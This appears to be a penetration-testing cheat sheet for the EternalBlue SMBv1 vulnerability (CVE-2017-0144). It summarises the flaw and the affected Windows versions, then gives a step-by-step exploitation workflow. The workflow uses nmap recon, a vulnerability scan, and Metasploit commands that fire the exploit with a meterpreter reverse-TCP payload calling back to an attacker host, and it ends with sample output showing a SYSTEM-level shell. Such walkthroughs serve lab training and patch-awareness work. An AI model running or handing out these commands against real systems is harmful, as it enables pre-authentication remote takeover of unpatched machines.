## Overview

- **CVE**: CVE-2017-0144  
- **Patch**: Microsoft MS17-010 (March 2017)  
- **Exploit Origin**: Developed by NSA, leaked by **Shadow Brokers** (2017)  
- **Impact**: **Remote Code Execution (RCE)** via SMBv1 â†’ full SYSTEM access  
- **Famous Use**: **WannaCry ransomware** worm (May 2017)

---
## Affected Systems

âœ… Vulnerable if **unpatched** and **SMBv1 enabled**:

- Windows Vista  
- Windows 7  
- Windows Server 2008 / 2008 R2  
- Windows 8.1  
- Windows Server 2012 / 2012 R2  
- Windows 10 (pre-1703)  
- Windows Server 2016 (pre-patch)

> âš ï¸ **Patched systems are safe** â€” but many remain unpatched in labs/legacy networks.

---
## Technical Root Cause

- Flaw in **SMBv1** protocol handling of **crafted packets**.
- Allows **heap overflow** â†’ arbitrary code execution as **NT AUTHORITY\SYSTEM**.
- Works **without authentication** â†’ pre-auth RCE.

> ðŸ”¥ One of the most dangerous Windows vulnerabilities ever disclosed.

---
## Exploitation Workflow

### 1. **Recon: Confirm SMB & OS**

```bash
nmap -sV -O -p 445 192.168.1.10
```

â†’ Look for:
- `445/tcp open  microsoft-ds`
- OS like `Windows 7` or `Windows Server 2008`

### 2. **Check for MS17-010 Vulnerability**

#### Option A: Nmap Script

```bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10
```

âœ… Output: `VULNERABLE`

#### Option B: Metasploit Auxiliary Module

```msf
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.10
run
```
âœ… Output: `[+] Host is likely VULNERABLE`

> ðŸ’¡ Both methods confirm exploitability **before launching payload**.

---
### 3. **Exploit with Metasploit**

```msf
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
```

âœ… Success:  
```
[*] Sending stage (206403 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> ðŸŽ¯ You now have **full SYSTEM-level control**.

---
## Critical Notes

- **Only works if SMBv1 is enabled** (disabled by default in Win 10 1709+ and Server 2016+).
- **No user interaction required** â€” pure network-based RCE.
- Always **verify patch status** â€” many systems appear vulnerable but are patched (false positives possible).
- Use **auxiliary scanner first** â€” avoid crashing targets with failed exploits.

> âœ… EternalBlue remains a **top-tier exploit** in unpatched Windows environments.

